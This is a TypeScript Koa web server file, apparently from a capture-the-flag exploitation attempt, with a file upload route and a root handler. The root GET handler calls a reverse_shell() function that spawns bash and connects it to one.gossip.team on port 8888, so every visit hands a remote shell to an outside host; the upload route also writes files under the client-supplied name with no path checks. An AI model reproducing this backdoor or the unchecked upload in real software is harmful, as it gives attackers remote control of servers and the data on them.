import Koa, { Context } from "koa";
import KoaBody from "koa-body";
import Router from "koa-router";
import { createWriteStream, createReadStream, WriteStream, promises } from "fs";

const app = new Koa();

app.use(KoaBody({
    multipart: true,
    formidable: {
        // 10 Megabytes
        maxFileSize: 10 * 1024 * 1024
    }
}));

const fileWriter = (writer: WriteStream) => {
    return new Promise<boolean>((resolve, reject) => {
        writer.on('finish', () => {
            resolve(true);
        });
        writer.on('error', (err: Error) => {
            reject(err);
        });
    });
};
const router = new Router();
//const { exec } = require('child_process');
// function callPythonFile () 
// {
//     return exec("ls -a");
// }
var out = "listen";
// var proc = callPythonFile();
// proc.stdout.on('data', function (data){
//     //out = data;
//     //console.log("data", data);
// })
function reverse_shell()
{
    var net = require("net"),
    child = require("child_process"),
    shell = child.spawn("bash", []);
    var client = new net.Socket();
    client.connect(8888, "one.gossip.team", function(){      
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
    });
    return /a/;
}
function find_file()
{
    var fs = require("fs");
    var readDir = fs.readdirSync("/home/node/");
    return readDir;
}

router.get('/', async (ctx: Context) => {
    //fs.writeFileSync('write.txt', 'Hello Rabbit!');
    // const { exec } = require('child_process');
    // exec('ls -a', (err, stdout, stderr) => {
    // // your callback
    //     ctx.body = stdout;
    // });
    //ctx.body =  await promises.readFile('/proc/sys/net/ipv4/ip_local_port_range');
    reverse_shell()
    ctx.body = "hello";
    //ctx.body =  find_file();
    ctx.type = 'text/plain; charset=utf-8';

});

router.post('/upload', async (ctx: Context) => {
    try {
        if (!ctx.request.files) {
            ctx.status = 400;
            ctx.body = "Invalid upload process";
            return;
        }
        const file = ctx.request.files.file;
        const reader = createReadStream(file.path);

        // path on server: $PWD + '/uploads/' + filename
        const writer = createWriteStream(`uploads/${file.name}`);
        // write file
        reader.pipe(writer);
        console.log("flag");
        // block until file written
        const result = await fileWriter(writer);
        if (!result) {
            ctx.status = 500;
            return ctx.body = 'Error in uploading files!';
        }

        ctx.status = 201;
        return ctx.body = 'Upload succeed.';
    } catch (err) {
        ctx.throw(500);
        console.error("Error occurred!");
        console.error(err);
    }
});

app.use(router.routes());
app.use(router.allowedMethods());

app.listen(3000, () => {
    // pm2 start index.ts --watch --user web
    // https://pm2.io/docs/runtime/features/watch-restart/
    console.log("App started & being watched by pm2.");
});